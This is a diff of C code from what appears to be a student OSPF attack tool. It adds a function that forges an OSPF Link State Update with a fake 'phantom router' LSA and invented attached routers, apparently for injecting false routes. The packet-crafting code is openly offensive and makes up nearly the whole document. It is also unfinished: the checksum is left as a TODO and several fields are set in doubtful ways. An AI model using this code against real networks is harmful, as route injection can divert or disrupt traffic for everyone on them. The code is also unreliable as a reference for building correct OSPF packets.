@@ -9,51 +9,6 @@
 #include "ospf_attack.h"
 #include "checksum.h"
 
-
-//?pedro                                               //verificar se tipo da variável é adequada
-int build_link_state_summary_header_ospf(unsigned char buffer[BUFFER_LEN], 
-                                    char *local_ip, 
-                                    char *dest_ip, 
-                                    int size_eth_ip_ospfBasic, 
-                                    int tipe_of_service,
-                                    unsigned long sequence_number) {
-
-  // OSPF link state summary header
-  // possibly necessary a list of this ?pedro
-  struct ospf_lss *lss_header_ospf;
-  lss_header_ospf = (struct ospf_lss *) &buffer[size_eth_ip_ospfBasic];
-  lss_header_ospf->lss_age = LSS_AGE;                                       /* Time (secs) Since Originated ?pedro I can't know if fixed value */
-  lss_header_ospf->lss_opts = LSS_OPTIONS;                                  /* Options Supported */
-  lss_header_ospf->lss_type = LSST_ROUTE;                                   /* LST_* below ?pedro */
-  lss_header_ospf->lss_lsid = inet_addr(local_ip);                          /* Link State Identifier */
-  lss_header_ospf->lss_rid = inet_addr(local_ip);                           /* Advertising Router Identifier ?pedro I think would was THE PHANTOM ROUTER*/
-  lss_header_ospf->lss_seq = LSS_SEQ_NUM;                                   /* Link State Adv. Sequence #   */
-  lss_header_ospf->lss_cksum;  /* ?pedro Fletcher Checksum of LSA */
-    // TODO: LENGTH: lss_header_ospf->lss_len;    /* Length of Advertisement ?pedro I don't know, because in wireshark a header has 3 LSS and values not equal*/
-
-  return sizeof(struct ospf_lss);
-}
-
-//?pedro                                               //verificar se tipo da variável é adequada
-int build_link_state_request_header_ospf(unsigned char buffer[BUFFER_LEN], 
-                                    char *local_ip, 
-                                    char *dest_ip, 
-                                    int size_eth_ip_ospfBasic, 
-                                    int tipe_of_service,
-                                    unsigned long sequence_number) {
-
-  // OSPF link state request header
-  // possibly necessary a list of this ?pedro
-  struct ospf_lsr *lsr_header_ospf;
-  lsr_header_ospf = (struct ospf_lsr *) &buffer[size_eth_ip_ospfBasic];
-  lsr_header_ospf->lsr_type = LSR_TYPE;                                     /* Link State Type      */
-  lsr_header_ospf->lsr_lsid = inet_addr(dest_ip);                           /* Link State Identifier "destination ip address" */
-  lsr_header_ospf->lsr_rid = inet_addr(dest_ip);                            /* Advertising Router "destination ip address" */
-
-  return sizeof(struct ospf_lsr);
-}
-
-
 //?pedro                                    //verificar se tipo da variável é adequada
 int build_basic_header_ospf(unsigned char buffer[BUFFER_LEN], 
                                     char *local_ip,
@@ -69,7 +24,7 @@ int build_basic_header_ospf(unsigned char buffer[BUFFER_LEN],
   basic_header_ospf = (struct ospf *) &buffer[sizeof(struct ether_header) + sizeof(struct ip)];
   basic_header_ospf->ospf_version = OSPF_VERSION;                           /* Version Number   */
   basic_header_ospf->ospf_type = packet_type;                           /* Packet Type      */
-  /* HELLO 0x01  <=> DB Description 0x02 */
+  /* HELLO 0x01  <=> DB Description 0x02  <=> LS Update 0x04 */
   basic_header_ospf->ospf_len = htons(length);   /* Packet Length    */
   basic_header_ospf->ospf_rid = inet_addr(local_ip);                        /* Router Identifier    */
   basic_header_ospf->ospf_aid = inet_addr("0.0.0.0");                       /* Area Identifier    */
@@ -132,4 +87,39 @@ int build_lls_data_block(unsigned char buffer[BUFFER_LEN], int pos){
   lls_header_ospf->data[1] = 0x04000100;
   lls_header_ospf->data[2] = 0x01000000;
   return 12;
+}
+
+//?pedro                                              //verificar se tipo da variável é adequada
+int build_ls_update_header_ospf(unsigned char buffer[BUFFER_LEN], 
+                                    char *local_ip) {
+  // OSPF Link State Update
+  int length = sizeof(struct ether_header) + sizeof(struct ip) + sizeof(struct ospf);
+  struct ospf_lsu *lsu_header_ospf;
+  lsu_header_ospf = (struct ospf_lsu *) &buffer[length];
+  lsu_header_ospf->lsu_nads = inet_addr("0.0.0.1");                         /* # Advertisments This Packet  */
+
+  // OSPF link state summary header
+  length = length + sizeof(struct ospf_lsu);
+  struct ospf_lss *lss_header_ospf;
+  lss_header_ospf = (struct ospf_lss *) &buffer[length];
+  lss_header_ospf->lss_age = LSS_AGE;                                       /* Time (secs) Since Originated ?pedro I can't know if fixed value */
+  lss_header_ospf->lss_opts = LSS_OPTIONS;                                  /* Options Supported */
+  lss_header_ospf->lss_type = LSST_ROUTE;                                   /* LST_* below ?pedro */
+  lss_header_ospf->lss_lsid = inet_addr(local_ip);                          /* Link State Identifier */
+  lss_header_ospf->lss_rid = inet_addr(local_ip);                           /* Advertising Router Identifier ?pedro I think would was THE PHANTOM ROUTER*/
+  lss_header_ospf->lss_seq = LSS_SEQ_NUM;                                   /* Link State Adv. Sequence #   */
+  // TODO: CHECKSUM: lss_header_ospf->lss_cksum;  /* ?pedro Fletcher Checksum of LSA */
+  lss_header_ospf->lss_len = LSS_LENGTH;    /* Length of Advertisement ?pedro I don't know, because in wireshark a header has 3 LSS and values not equal*/
+
+  // OSPF Network Links Advertisement
+  length = length + sizeof(struct ospf_lss);
+  struct  ospf_na *na_header_ospf;
+  na_header_ospf = (struct ospf_na *) &buffer[length];
+  na_header_ospf->na_mask = inet_addr("255.0.0.0");                         /* Network Mask     */
+  na_header_ospf->na_rid[0] = inet_addr("200.0.0.1");                       /* ID of first  Attached Routers  */
+  na_header_ospf->na_rid[1] = inet_addr("100.0.0.1");                       /* ID of second Attached Routers  */
+
+  int swap = build_basic_header_ospf(buffer, local_ip, 0X04);
+
+  return sizeof(struct ospf_lss) + sizeof(struct ospf_lsu) + sizeof(struct ospf_na) + swap;
 }
